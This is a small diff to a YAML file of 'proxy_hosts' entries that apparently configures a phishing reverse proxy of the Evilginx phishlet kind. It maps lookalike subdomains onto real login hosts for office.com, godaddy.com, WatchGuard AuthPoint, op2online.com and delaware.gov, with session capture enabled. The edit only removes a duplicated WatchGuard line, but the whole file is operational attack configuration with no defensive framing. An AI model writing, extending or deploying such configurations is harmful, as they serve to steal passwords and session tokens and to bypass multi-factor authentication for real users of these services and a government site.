@@ -22,7 +22,6 @@ proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
   - { phish_sub: "sautsa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "sautsa", orig_sub: "sp.authpoint.usa", domain: "cloud.watchguard.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "usaa", orig_sub: "usa", domain: "authpoint.watchguard.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "autsh", orig_sub: "auth", domain: "op2online.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: "isd", orig_sub: "id", domain: "delaware.gov", session: true, is_landing: false, auto_filter: false }
